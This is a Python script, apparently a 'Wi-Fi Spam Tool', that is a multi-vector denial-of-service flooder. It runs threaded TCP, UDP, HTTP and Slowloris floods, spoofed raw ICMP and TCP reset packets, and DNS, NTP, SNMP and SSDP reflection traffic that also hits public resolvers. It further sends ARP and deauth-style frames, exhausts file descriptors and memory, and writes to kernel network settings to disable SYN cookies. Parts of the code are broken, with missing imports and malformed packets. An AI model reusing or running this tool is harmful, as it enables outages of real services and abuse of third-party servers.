#DARK TOOLS NO ROOTS
#!/usr/bin/python3
# -*- coding: utf-8 -*-

import time,sys,socket,threading,random,os,signal,struct,binascii
from queue import Queue
from optparse import OptionParser

def a():
    global b
    b=[]
    b.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36")
    b.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/16.1 Safari/605.1.15")
    b.append("Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/121.0")
    b.append("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1")
    b.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36")
    b.append("Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0")
    b.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 Chrome/118.0.5993.88 Safari/537.36 OPR/104.0.4944.36")
    b.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0")
    b.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0")
    b.append("Mozilla/5.0 (X11; CrOS aarch64 15717.0.0) AppleWebKit/537.36 Chrome/120.0.6099.216 Safari/537.36")
    b.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.5938.92 Safari/537.36")
    b.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36")
    b.append("Mozilla/5.0 (X11; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0")
    b.append("Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 Chrome/116.0.5845.188 Safari/537.36")
    b.append("Mozilla/5.0 (Android 13; Mobile; rv:117.0) Gecko/117.0 Firefox/117.0")
    b.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.5790.171 Safari/537.36")
    b.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 Version/14.0.3 Safari/605.1.15")
    b.append("Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.6045.159 Safari/537.36")
    b.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.5735.199 Safari/537.36 OPR/100.0.4815.82")
    b.append("Mozilla/5.0 (X11; FreeBSD amd64; rv:117.0) Gecko/20100101 Firefox/117.0")
    return(b)

def c():
    global d
    d=[]
    d.append("http://validator.w3.org/check?uri=")
    d.append("http://www.facebook.com/sharer/sharer.php?u=")
    d.append("http://www.linkedin.com/shareArticle?url=")
    d.append("http://pinterest.com/pin/create/button/?url=")
    d.append("http://twitter.com/intent/tweet?url=")
    return(d)

def e():
    f = random.randint(32768, 131072)
    g = os.urandom(f)
    return g

def h():
    i = random.randint(131072, 524288)
    j = os.urandom(i)
    k = (
        "POST / HTTP/1.1\r\n"
        f"Host: {l}\r\n"
        f"User-Agent: {random.choice(b)}\r\n"
        "Accept: */*\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Accept-Language: en-US,en;q=0.9\r\n"
        "Cache-Control: no-cache, no-store, must-revalidate\r\n"
        f"Content-Length: {len(j)}\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Connection: keep-alive\r\n"
        "Pragma: no-cache\r\n"
        "Upgrade-Insecure-Requests: 1\r\n\r\n"
    ).encode('utf-8') + j
    return k

def m():
    n = random.randint(65536, 262144)
    o = os.urandom(n)
    p = struct.pack("!HHHHHH", random.randint(0,65535), 0x0100, random.randint(1,10), 0, 0, 0)
    q = b"\x03" + b"\x00" + b"\x00" + b"\x00" + b"\x00" + b"\x00" + b"\x00" + b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    r = p + q + o
    return r

def s():
    t = random.randint(4096, 16384)
    u = os.urandom(t)
    v = b"\x45\x00" + struct.pack("!H", 20 + len(u)) + b"\x00\x01" + b"\x00\x00" + b"\x40" + b"\x01" + b"\x00\x00" + socket.inet_aton(".".join(str(random.randint(1,254)) for _ in range(4))) + socket.inet_aton(l)
    w = b"\x08\x00" + struct.pack("!H", 0) + struct.pack("!H", 0) + u
    x = v + w
    return x

def y():
    z = random.randint(8192, 65536)
    aa = os.urandom(z)
    ab = b"\x17\x00\x03\x2a" + b"\x00" * 12 + aa
    return ab

def ac():
    ad = random.randint(16384, 98304)
    ae = os.urandom(ad)
    af = b"\x30" + bytes([len(ae) + 20]) + b"\x02\x01\x00" + b"\x04\x06\x70\x75\x62\x6c\x69\x63" + b"\xa0" + bytes([len(ae) + 10]) + b"\x02\x04" + struct.pack("!I", random.randint(0,4294967295)) + b"\x02\x04" + struct.pack("!I", random.randint(0,4294967295)) + b"\x30\x0e\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00" + ae
    return af

def ag():
    ah = random.randint(32768, 196608)
    ai = os.urandom(ah)
    aj = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: " + str(random.randint(1,10)).encode() + b"\r\nST: upnp:rootdevice\r\nUSER-AGENT: " + random.choice(b).encode() + b"\r\n\r\n" + ai
    return aj

def ak(al, am):
    an = 0x00C0
    ao = 0
    ap = random.randint(0,4095)
    aq = struct.pack("!HH6s6s6sHH", an, ao, al, am, al, ap, 0x0007, 0x0000)
    ar = struct.pack("!H", an)
    as_ = binascii.crc32(ar + aq[2:]) & 0xFFFFFFFF
    at = b"\x00\x04" + os.urandom(4)
    au = aq + struct.pack("!I", as_) + at
    return au

def av():
    aw = None
    try:
        while True:
            ax = h()
            aw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            aw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            aw.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
            aw.settimeout(2)
            aw.connect((l, int(ay)))
            aw.sendall(ax)
            try:
                aw.settimeout(0.005)
                aw.recv(8192)
            except:
                pass
            try:
                aw.shutdown(socket.SHUT_RDWR)
                aw.close()
            except:
                pass
            aw = None
            time.sleep(0.001)
    except:
        if aw:
            try:
                aw.close()
            except:
                pass
        time.sleep(0.001)

def az():
    ba = None
    try:
        while True:
            bb = e()
            ba = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ba.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
            ba.sendto(bb, (l, int(ay)))
            ba.close()
            ba = None
            time.sleep(0.0005)
    except:
        if ba:
            try:
                ba.close()
            except:
                pass
        time.sleep(0.0005)

def bc():
    bd = []
    try:
        for _ in range(3000):
            try:
                be = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                be.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                be.settimeout(3)
                be.connect((l, int(ay)))
                be.send(f"GET / HTTP/1.1\r\nHost: {l}\r\nUser-Agent: {random.choice(b)}\r\nAccept: text/html\r\n".encode('utf-8'))
                bd.append(be)
            except:
                pass
        while True:
            for be in list(bd):
                try:
                    be.send(f"X-Header: {random.choice(b)}\r\n".encode('utf-8'))
                except:
                    bd.remove(be)
                    try:
                        bf = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        bf.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        bf.settimeout(3)
                        bf.connect((l, int(ay)))
                        bf.send(f"GET / HTTP/1.1\r\nHost: {l}\r\nUser-Agent: {random.choice(b)}\r\nAccept: text/html\r\n".encode('utf-8'))
                        bd.append(bf)
                    except:
                        pass
            time.sleep(15)
    except:
        for be in bd:
            try:
                be.close()
            except:
                pass

def bg():
    try:
        while True:
            bh = random.choice(d) + "http://" + l
            bi = urllib.request.Request(bh, headers={'User-Agent': random.choice(b)})
            urllib.request.urlopen(bi, timeout=2)
            time.sleep(0.001)
    except:
        time.sleep(0.001)

def bj():
    bk = None
    try:
        while True:
            bl = m()
            bk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bk.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            bk.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
            bk.sendto(bl, (l, 53))
            bk.sendto(bl, ("8.8.8.8", 53))
            bk.sendto(bl, ("1.1.1.1", 53))
            bk.close()
            bk = None
            time.sleep(0.0005)
    except:
        if bk:
            try:
                bk.close()
            except:
                pass
        time.sleep(0.0005)

def bm():
    bn = None
    try:
        while True:
            bo = y()
            bn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bn.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
            bn.sendto(bo, (l, 123))
            bn.sendto(bo, ("pool.ntp.org", 123))
            bn.sendto(bo, ("time.google.com", 123))
            bn.close()
            bn = None
            time.sleep(0.0005)
    except:
        if bn:
            try:
                bn.close()
            except:
                pass
        time.sleep(0.0005)

def bp():
    bq = None
    try:
        while True:
            br = ag()
            bq = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bq.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            bq.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 64)
            bq.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
            bq.sendto(br, ("239.255.255.250", 1900))
            bq.sendto(br, ("224.0.0.1", 1900))
            bq.sendto(br, ("255.255.255.255", 1900))
            bq.close()
            bq = None
            time.sleep(0.0005)
    except:
        if bq:
            try:
                bq.close()
            except:
                pass
        time.sleep(0.0005)

def bs():
    bt = None
    try:
        while True:
            bu = ac()
            bt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bt.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
            bt.sendto(bu, (l, 161))
            bt.sendto(bu, ("127.0.0.1", 161))
            bt.close()
            bt = None
            time.sleep(0.0005)
    except:
        if bt:
            try:
                bt.close()
            except:
                pass
        time.sleep(0.0005)

def bv():
    bw = None
    try:
        while True:
            bx = s()
            bw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            bw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            bw.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
            bw.sendto(bx, (l, 0))
            bw.close()
            bw = None
            time.sleep(0.0005)
    except:
        if bw:
            try:
                bw.close()
            except:
                pass
        time.sleep(0.0005)

def by():
    bz = None
    try:
        while True:
            ca = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ca.settimeout(1)
            ca.connect((l, int(ay)))
            ca.send(b"GET / HTTP/1.1\r\nHost: " + l.encode() + b"\r\nConnection: keep-alive\r\n\r\n")
            cb = []
            for _ in range(500):
                cc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                cc.settimeout(1)
                cc.connect((l, int(ay)))
                cb.append(cc)
            for cc in cb:
                try:
                    cc.send(b"GET /" + os.urandom(256).hex().encode() + b" HTTP/1.1\r\nHost: " + l.encode() + b"\r\n\r\n")
                except:
                    pass
            time.sleep(0.0005)
    except:
        pass

def cd():
    ce = []
    try:
        while True:
            for _ in range(500):
                ce.append(open("/dev/null", "r"))
                ce.append(open("/proc/self/status", "r"))
                ce.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
            time.sleep(0.01)
    except:
        pass

def cf():
    cg = []
    try:
        while True:
            cg.append(os.urandom(1024*1024*50))
            time.sleep(0.001)
    except:
        pass

def ch():
    ci = None
    try:
        while True:
            cj = ak(bytes([0x00,0x1A,0x2B,0x3C,0x4D,0x5E]), bytes([0xAA,0xBB,0xCC,0xDD,0xEE,0xFF]))
            for ck in ["wlan0", "wlan1", "mon0", "ath0"]:
                try:
                    cl = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
                    cl.bind((ck, 0))
                    cl.send(cj)
                    cl.close()
                except:
                    pass
            time.sleep(0.0005)
    except:
        pass

def cm():
    cn = None
    try:
        while True:
            co = random.randint(0,4294967295)
            cp = struct.pack("!4s4s", socket.inet_aton(l), socket.inet_aton("192.168.1.1"))
            cq = b"\x00"*6 + b"\xff"*6 + struct.pack("!H", 0x0806) + struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2) + b"\x00"*6 + socket.inet_aton(l) + b"\xff"*6 + socket.inet_aton("192.168.1.1")
            cr = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
            cr.bind(("eth0", 0))
            cr.send(cq)
            cr.close()
            time.sleep(0.001)
    except:
        pass

def cs():
    ct = None
    try:
        while True:
            cu = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            cu.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            cv = socket.inet_aton(".".join(str(random.randint(1,254)) for _ in range(4)))
            cw = socket.inet_aton(l)
            cx = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(1,65535), 0, 64, 6, 0, cv, cw)
            cy = struct.pack("!HHLLBBHHH", random.randint(1024,65535), int(ay), random.randint(0,4294967295), 0, 5<<4, 0x04, 1024, 0, 0)
            cz = cx + cy
            cu.sendto(cz, (l, int(ay)))
            cu.close()
            cu = None
            time.sleep(0.0005)
    except:
        if cu:
            try:
                cu.close()
            except:
                pass
        time.sleep(0.0005)

def da():
    try:
        while True:
            db = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            db.settimeout(1)
            db.connect((l, int(ay)))
            dc = ssl.create_default_context()
            dc.check_hostname = False
            dc.verify_mode = ssl.CERT_NONE
            dd = dc.wrap_socket(db, server_hostname=l)
            dd.send(b"GET / HTTPS/1.1\r\nHost: " + l.encode() + b"\r\n\r\n")
            dd.close()
            time.sleep(0.0005)
    except:
        pass

def de():
    try:
        while True:
            df = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            df.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            df.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            df.connect((l, int(ay)))
            dg = []
            for _ in range(1000):
                dh = b"GET /" + os.urandom(64).hex().encode() + b" HTTP/1.1\r\nHost: " + l.encode() + b"\r\nConnection: Keep-Alive\r\n\r\n"
                df.send(dh)
            df.close()
            time.sleep(0.001)
    except:
        pass

def di():
    try:
        while True:
            with open("/proc/sys/net/ipv4/tcp_syncookies", "w") as dj:
                dj.write("0")
            with open("/proc/sys/net/ipv4/tcp_tw_reuse", "w") as dj:
                dj.write("0")
            with open("/proc/sys/net/ipv4/tcp_tw_recycle", "w") as dj:
                dj.write("0")
            with open("/proc/sys/net/core/somaxconn", "w") as dj:
                dj.write("0")
            with open("/proc/sys/net/ipv4/tcp_max_syn_backlog", "w") as dj:
                dj.write("0")
            time.sleep(0.001)
    except:
        pass

def dk():
    while True:
        dl = dq.get()
        av()
        dq.task_done()

def dm():
    while True:
        dl = dn.get()
        az()
        dn.task_done()

def do():
    while True:
        dl = dp.get()
        bg()
        dp.task_done()

def dr():
    while True:
        dl = ds.get()
        bc()
        ds.task_done()

def dt():
    while True:
        dl = du.get()
        bj()
        du.task_done()

def dv():
    while True:
        dl = dw.get()
        bm()
        dw.task_done()

def dx():
    while True:
        dl = dy.get()
        bp()
        dy.task_done()

def dz():
    while True:
        dl = ea.get()
        bs()
        ea.task_done()

def eb():
    while True:
        dl = ec.get()
        bv()
        ec.task_done()

def ed():
    while True:
        dl = ee.get()
        by()
        ee.task_done()

def ef():
    while True:
        dl = eg.get()
        cd()
        eg.task_done()

def eh():
    while True:
        dl = ei.get()
        cf()
        ei.task_done()

def ej():
    while True:
        dl = ek.get()
        ch()
        ek.task_done()

def el():
    while True:
        dl = em.get()
        cm()
        em.task_done()

def en():
    while True:
        dl = eo.get()
        cs()
        eo.task_done()

def ep():
    while True:
        dl = eq.get()
        da()
        eq.task_done()

def er():
    while True:
        dl = es.get()
        de()
        es.task_done()

def et():
    while True:
        dl = eu.get()
        di()
        eu.task_done()

def ev():
    ew = 1
    try:
        while True:
            time.sleep(0.1)
            if ew == 0:
                break
    except KeyboardInterrupt:
        ew = 0
        print("\n[!] CTRL+C detected - stopping all threads")
        sys.exit(0)

def ex():
    print('''    
 Wi-Fi Spam Tool - Non-Root Edition
    
 usage: python3 spam.py -s <ip> [-p <port>] [-t <threads>] [-m <mode>]
    -h : help
    -s : target ip address
    -p : target port (default 80)
    -t : thread multiplier (default 1000)
    -m : mode (tcp/udp/both/http/dns/ntp/ssdp/snmp/icmp/full) default full''')
    sys.exit()

def ey():
    global l
    global ay
    global ez
    global dl
    global fa
    optp = OptionParser(add_help_option=False)
    optp.add_option("-s", "--server", dest="l", help="target ip")
    optp.add_option("-p", "--port", type="int", dest="ay", help="port")
    optp.add_option("-t", "--turbo", type="int", dest="ez", help="threads")
    optp.add_option("-h", "--help", dest="fa", action='store_true', help="help")
    optp.add_option("-m", "--mode", dest="fb", help="tcp/udp/both/http/dns/ntp/ssdp/snmp/icmp/full")
    opts, args = optp.parse_args()
    if opts.fa:
        ex()
    if opts.l is not None:
        l = opts.l
    else:
        ex()
    if opts.ay is None:
        ay = 80
    else:
        ay = opts.ay
    if opts.ez is None:
        ez = 1000
    else:
        ez = opts.ez
    if opts.fb is None:
        fb = "full"
    else:
        fb = opts.fb

dq = Queue()
dn = Queue()
dp = Queue()
ds = Queue()
du = Queue()
dw = Queue()
dy = Queue()
ea = Queue()
ec = Queue()
ee = Queue()
eg = Queue()
ei = Queue()
ek = Queue()
em = Queue()
eo = Queue()
eq = Queue()
es = Queue()
eu = Queue()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        ex()
    ey()
    a()
    c()
    print(l, "port:", ay, "threads:", ez, "mode:", fb)
    time.sleep(1)
    signal.signal(signal.SIGINT, lambda fc, fd: sys.exit(0))
    try:
        fc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        fc.settimeout(1)
        fc.connect((l, int(ay)))
        fc.close()
    except:
        pass
    if fb in ["tcp", "both", "full"]:
        for _ in range(int(ez)):
            ff = threading.Thread(target=dk)
            ff.daemon = True
            ff.start()
        print("[+] TCP threads running")
    if fb in ["udp", "both", "full"]:
        for _ in range(int(ez/2)):
            ff = threading.Thread(target=dm)
            ff.daemon = True
            ff.start()
        print("[+] UDP threads running")
    if fb in ["http", "full"]:
        for _ in range(int(ez/3)):
            ff = threading.Thread(target=do)
            ff.daemon = True
            ff.start()
        for _ in range(int(ez/6)):
            ff = threading.Thread(target=dr)
            ff.daemon = True
            ff.start()
        print("[+] HTTP bot + Slowloris threads running")
    if fb in ["dns", "full"]:
        for _ in range(int(ez/4)):
            ff = threading.Thread(target=dt)
            ff.daemon = True
            ff.start()
        print("[+] DNS amplification threads running")
    if fb in ["ntp", "full"]:
        for _ in range(int(ez/4)):
            ff = threading.Thread(target=dv)
            ff.daemon = True
            ff.start()
        print("[+] NTP amplification threads running")
    if fb in ["ssdp", "full"]:
        for _ in range(int(ez/4)):
            ff = threading.Thread(target=dx)
            ff.daemon = True
            ff.start()
        print("[+] SSDP multicast threads running")
    if fb in ["snmp", "full"]:
        for _ in range(int(ez/4)):
            ff = threading.Thread(target=dz)
            ff.daemon = True
            ff.start()
        print("[+] SNMP reflection threads running")
    if fb in ["icmp", "full"]:
        for _ in range(int(ez/3)):
            ff = threading.Thread(target=eb)
            ff.daemon = True
            ff.start()
        print("[+] ICMP fragmentation threads running")
    if fb in ["full"]:
        for _ in range(int(ez/8)):
            ff = threading.Thread(target=ed)
            ff.daemon = True
            ff.start()
            ff = threading.Thread(target=ef)
            ff.daemon = True
            ff.start()
            ff = threading.Thread(target=eh)
            ff.daemon = True
            ff.start()
            ff = threading.Thread(target=ej)
            ff.daemon = True
            ff.start()
            ff = threading.Thread(target=el)
            ff.daemon = True
            ff.start()
            ff = threading.Thread(target=en)
            ff.daemon = True
            ff.start()
            ff = threading.Thread(target=ep)
            ff.daemon = True
            ff.start()
            ff = threading.Thread(target=er)
            ff.daemon = True
            ff.start()
            ff = threading.Thread(target=et)
            ff.daemon = True
            ff.start()
        print("[+] Extra vectors: pipeline flood, fd leak, OOM, deauth, ARP, reset, SSL, kernel hammer")
    fg = threading.Thread(target=ev)
    fg.daemon = True
    fg.start()
    while True:
        for _ in range(int(ez)):
            if fb in ["tcp", "both", "full"]:
                dq.put(_)
            if fb in ["udp", "both", "full"]:
                dn.put(_)
            if fb in ["http", "full"]:
                dp.put(_)
                ds.put(_)
            if fb in ["dns", "full"]:
                du.put(_)
            if fb in ["ntp", "full"]:
                dw.put(_)
            if fb in ["ssdp", "full"]:
                dy.put(_)
            if fb in ["snmp", "full"]:
                ea.put(_)
            if fb in ["icmp", "full"]:
                ec.put(_)
            if fb in ["full"]:
                ee.put(_)
                eg.put(_)
                ei.put(_)
                ek.put(_)
                em.put(_)
                eo.put(_)
                eq.put(_)
                es.put(_)
                eu.put(_)
        time.sleep(0.0001)
